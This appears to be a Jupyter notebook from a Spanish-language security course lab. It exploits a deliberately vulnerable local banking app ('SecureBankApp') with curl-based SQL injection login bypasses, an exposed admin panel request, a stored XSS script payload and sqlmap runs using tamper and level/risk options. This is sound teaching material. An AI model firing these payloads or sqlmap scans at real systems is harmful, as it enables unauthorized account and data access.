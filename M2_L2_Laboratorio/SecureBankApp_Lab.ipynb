{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "a03f64b1",
   "metadata": {},
   "source": [
    "# Laboratorio: Explotación de Vulnerabilidades en SecureBankApp\n",
    "Guía interactiva para Google Colab. Copia y ejecuta cada celda."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "137e1ea5",
   "metadata": {},
   "source": [
    "## 1. Preparar el entorno\n",
    "\n",
    "1. Abrir terminal Bash (Git-Bash, WSL, Linux o macOS).\n",
    "2. Instalar **sqlmap** y dependencias de la aplicación."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fc27c8a2",
   "metadata": {},
   "outputs": [],
   "source": [
    "!pip install sqlmap"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5f53ae27",
   "metadata": {},
   "outputs": [],
   "source": [
    "!pip install -r requirements.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2ca62452",
   "metadata": {},
   "source": [
    "## 2. Arrancar la aplicación vulnerable\n",
    "Ejecuta la siguiente celda en tu terminal local (no en Colab) para iniciar el servidor:\n",
    "```bash\n",
    "python SecureBankApp.py\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "25eb178b",
   "metadata": {},
   "source": [
    "## 3. SQL Injection manual con `curl`\n",
    "\n",
    "### 3.1 Bypass genérico (`' OR '1'='1' -- `)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2e1114ab",
   "metadata": {},
   "outputs": [],
   "source": [
    "curl -v -X POST http://127.0.0.1:5000/login \\\n",
    "     --data-urlencode \"username=' OR '1'='1' -- \" \\\n",
    "     --data-urlencode \"password=\"\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0fce2fac",
   "metadata": {},
   "source": [
    "### 3.2 Login como admin directo (`admin' -- `)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a0dab900",
   "metadata": {},
   "outputs": [],
   "source": [
    "curl -v -X POST http://127.0.0.1:5000/login \\\n",
    "     --data \"username=admin' -- \" \\\n",
    "     --data \"password=\"\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "82be1e32",
   "metadata": {},
   "source": [
    "## 4. Acceso expuesto al panel de administración"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "09b642ef",
   "metadata": {},
   "outputs": [],
   "source": [
    "curl -v http://127.0.0.1:5000/admin\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "69155a5d",
   "metadata": {},
   "source": [
    "## 5. XSS persistente con `curl`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bf6564d5",
   "metadata": {},
   "outputs": [],
   "source": [
    "curl -v -X POST http://127.0.0.1:5000/contact \\\n",
    "     --data-urlencode \"name=<script>alert('XSS')</script>\" \\\n",
    "     --data-urlencode \"message=Prueba\"\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "452bc896",
   "metadata": {},
   "source": [
    "## 6. Automatizar SQLi con `sqlmap`\n",
    "\n",
    "### 6.1 Prueba básica con comentario"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "51e3d533",
   "metadata": {},
   "outputs": [],
   "source": [
    "sqlmap \\\n",
    "  -u \"http://127.0.0.1:5000/login\" \\\n",
    "  --data=\"username=foo&password=foo\" \\\n",
    "  -p username \\\n",
    "  --dbms SQLite \\\n",
    "  --prefix=\"' OR '1'='1' -- \" \\\n",
    "  --ignore-code=401 \\\n",
    "  --batch\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d24839c2",
   "metadata": {},
   "source": [
    "### 6.2 Técnica avanzada con tamper y nivel/riesgo"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f4fe153d",
   "metadata": {},
   "outputs": [],
   "source": [
    "sqlmap \\\n",
    "  -u \"http://127.0.0.1:5000/login\" \\\n",
    "  --data=\"username=foo&password=foo\" \\\n",
    "  -p username \\\n",
    "  --dbms SQLite \\\n",
    "  --level 3 --risk 2 \\\n",
    "  --tamper=space2comment \\\n",
    "  --ignore-code=401 \\\n",
    "  --batch\n"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
